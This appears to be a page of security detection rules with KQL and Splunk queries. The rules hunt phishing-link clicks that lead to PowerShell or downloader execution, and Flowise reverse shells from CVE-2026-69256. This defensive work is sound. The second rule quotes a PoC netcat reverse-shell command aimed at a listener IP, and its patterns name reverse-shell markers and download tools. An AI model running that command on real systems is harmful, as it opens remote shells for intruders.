Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc

         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Flowise node/pyodide process spawning shell or netcat (CVE-2026-69256 RCE execution) AIInstallation High
Hunts the RCE outcome of CVE-2026-69256: the deserialised pickle calls os.system, causing the Flowise node process (which hosts pyodide) to spawn an unexpected Unix shell or netcat child. The PoC drops '/usr/bin/nc <ip> <port> -e /bin/sh'. A node/python parent spawning nc or an interactive reverse shell is highly abnormal for this server. Rationale: Anchored on the article's exact RCE outcome — os.system('/usr/bin/nc 172.17.0.1 13337 -e /bin/sh') fired from pyodide inside the Flowise node process — so the parent (node/python) + child (nc/shell) + reverse-shell cmdline triple is nearly zero-FP for an AI-agent server. Corroborated as a non-sandboxed pyodide executor by the related CSVAgent RCE write-ups. Cross-checked against: • https://github.com/advisories/GHSA-3hjv-c53m-58jj • https://www.bleepingcomputer.com/news/security/max-severity-flowise-rce-vulnerability-now-exploited-in-attacks/
ATT&CKT1059.006 T1059.004 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Node app legitimately shelling out via child_process.exec for git/ffmpeg/imagemagick (won't carry -e/dev-tcp reverse-shell markers)
  • Container healthcheck using 'nc -z host port' for TCP liveness probes
  • Python data pipeline invoking subprocess for a benign shell one-liner
  • DevOps entrypoint scripts spawning bash -c during container start
  • Ansible/CI runner using node tooling that calls sh
Suppression filter
| where not (FileName in~ ("nc","ncat","netcat") and ProcessCommandLine has_any ("-z","-w1","-w 1")) // drop TCP liveness probes
Response runbook
1) Triage: capture the full ProcessCommandLine and the listener IP:port; confirm parent is the Flowise node PID and decode any base64 in the chain. 2) Contain: isolate the host, kill the nc/shell child and the parent node process if attacker-controlled, and block the C2 IP:port egress at the firewall. 3) Hunt: correlate back to the triggering /api/v1/prediction POST (UC1) and the source IP, review the chatflow store for the malicious CSVAgent node, and sweep other Flowise hosts for the same parent→shell pattern.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("node","node.exe","python","python3")
| where (FileName in~ ("nc","ncat","netcat","nc.traditional"))
     or (FileName in~ ("sh","bash","dash","zsh") and ProcessCommandLine has_any ("-e /bin/sh","-e /bin/bash","/dev/tcp/","bash -i",">& /dev/tcp"))
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("node","python","python3")
| where (TargetProcessName has_any ("nc","ncat","netcat"))
     or (TargetProcessName has_any ("sh","bash","dash","zsh") and TargetProcessCommandLine has_any ("-e /bin/sh","-e /bin/bash","/dev/tcp/","bash -i",">& /dev/tcp"))
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc
